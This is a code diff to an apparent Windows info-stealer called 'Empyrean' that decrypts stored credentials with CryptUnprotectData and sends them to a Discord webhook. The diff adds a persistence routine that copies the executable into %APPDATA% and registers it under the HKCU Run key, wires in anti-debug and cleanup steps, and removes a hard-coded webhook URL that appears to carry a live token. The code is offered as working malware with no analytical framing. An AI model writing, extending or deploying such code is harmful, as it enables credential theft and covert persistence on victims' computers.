@@ -21,11 +21,15 @@ from win32crypt import CryptUnprotectData
 
 # Config
 
-webhook = "https://discord.com/api/webhooks/971971651245842442/4EZPGNyYqpS1n_0jmaNtOHJ43_MH6S7BOb5PAiJ9aEur9tIFQYGPdroJJXxsIKB6rF_n"
+webhook = "WEBHOOK_URL"
 
 # Config 
 
 def main(webhook: str) -> None: 
+    debug()
+    cleanup()
+    startup()
+    
     webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
     embed = Embed(title="Empyrean", color=0x000000)
     
@@ -547,8 +551,38 @@ class debug:
     
     def self_destruct(self):
         exit()
+
+class startup():
+    def __init__(self):
+        if not self.check(): return
+    
+        self.Empyrean_dir = self.mk_appdata()
+        self.mv_self()
+        self.reg_add()
+    
+    def check(self):
+        if os.path.splitext(__file__)[1] == ".exe":
+            return True
+        else:
+            return False
+    
+    def mk_appdata(self):
+        roaming = os.getenv("APPDATA")
         
+        shutil.rmtree(roaming + "\\" + "Empyrean") if os.path.exists(roaming + "\\" + "Empyrean") else None
+        
+        os.mkdir(roaming + "\\" + "Empyrean")
+        
+        Empyrean_dir = roaming + "\\" + "Empyrean" if os.path.exists(roaming + "\\" + "Empyrean") else None
+            
+        return Empyrean_dir
+    
+    def mv_self(self):
+        shutil.copy2(__file__, self.Empyrean_dir + "\\" + os.path.basename(__file__))
+
+    def reg_add(self):
+        subprocess.call(["reg", "delete", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/f"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.call(["reg", "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/t", "REG_SZ", "/d", self.Empyrean_dir + "\\" + os.path.basename(__file__)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+  
 if __name__ == "__main__":
-    debug()
-    cleanup()
     main(webhook)
